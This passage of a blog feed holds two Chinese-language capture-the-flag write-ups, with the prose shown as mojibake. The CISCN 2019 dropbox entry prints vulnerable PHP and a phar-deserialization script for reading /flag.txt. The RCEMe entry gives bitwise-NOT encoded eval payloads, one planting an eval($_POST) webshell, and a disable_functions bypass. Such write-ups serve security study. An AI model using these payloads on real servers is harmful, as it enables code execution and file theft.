punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">ä¸‹è½½&lt;/a> / &lt;a href="#" class="delete">åˆ é™¤&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h5 id="download-php"><a href="#download-php" class="headerlink" title="download.php"></a>download.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>delete.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>class.phpä¸­çš„Filelistç±»ä¸­çš„__destructå¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶</p><p>class.phpä¸­çš„deleteå‡½æ•°ä½¿ç”¨äº†unlinkå‡½æ•°</p><p>delete.phpä¸­åˆè°ƒç”¨äº†deleteå‡½æ•°</p><p>pharååºåˆ—åŒ–åˆ©ç”¨çš„ä¸‰ä¸ªæ¡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨pharååºåˆ—åŒ–æ¥èŽ·å–flag</p><h5 id="ç”Ÿæˆpharæ–‡ä»¶"><a href="#ç”Ÿæˆpharæ–‡ä»¶" class="headerlink" title="ç”Ÿæˆpharæ–‡ä»¶"></a>ç”Ÿæˆpharæ–‡ä»¶</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>       <span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>è¿™é‡Œè¦ç”¨php5</p><p>å¹¶åœ¨php.iniä¸­è®¾ç½®phar.readonly = Off</p><p>ç”Ÿæˆçš„pharæ–‡ä»¶åŽç¼€æ”¹ä¸ºjpg</p><p>æŽ¥ä¸‹æ¥å†ç‚¹å‡»åˆ é™¤æ–‡ä»¶ï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºphar://phar.jpgå³å¯èŽ·å¾—flag</p><p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210724222920804.png" alt="image-20210724222920804"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æžå®¢å¤§æŒ‘æˆ˜:2019-RCEMe</title>
      <link href="2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/"/>
      <url>2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å–åè¯»å–phpinfo</p><pre><code>&lt;?php$s = 'phpinfo';echo urlencode(~$s);#%8F%97%8F%96%91%99%90?&gt;</code></pre><p>payload</p><pre><code>?code=(~%8F%97%8F%96%91%99%90)();</code></pre><p>æŸ¥çœ‹åˆ°disable_functionsç¦ç”¨çš„å‡½æ•°ï¼š</p><p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721211242855.png" alt="1"></p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>æž„é€ å–åè¿žæŽ¥èšå‰‘ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'assert'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string">'(eval($_POST[1]))'</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$d</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><pre><code>%9E%8C%8C%9A%8D%8B%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6</code></pre><pre><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</code></pre><p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721213053074.png" alt="2"></p><p>èšå‰‘è¿žæŽ¥ï¼š</p><p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721223025932.png" alt="3"></p><p>å‘çŽ°æ ¹ç›®å½•ä¸‹æœ‰flagå’Œreadflag</p><p>åº”è¯¥æ˜¯é€šè¿‡æ‰§è¡Œreadflagæ¥è¯»å–flagï¼Œä½†æ˜¯è¿™é‡Œçš„shellå‘½ä»¤åŸºæœ¬ä¸Šéƒ½è¢«ç¦äº†</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡èšå‰‘çš„ç»•è¿‡disable_functionsæ¥æ‰§è¡Œ</p><p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721222846905.png" alt="4"></p><p>ä¸‹è½½ç»•è¿‡disable_functionsæ’ä»¶å¼€å¯</p><p>PHP7_GC_UAFæ¨¡å¼</p><p>ç„¶åŽæ‰§è¡Œreadflag</p><p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721223009841.png" alt="5"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
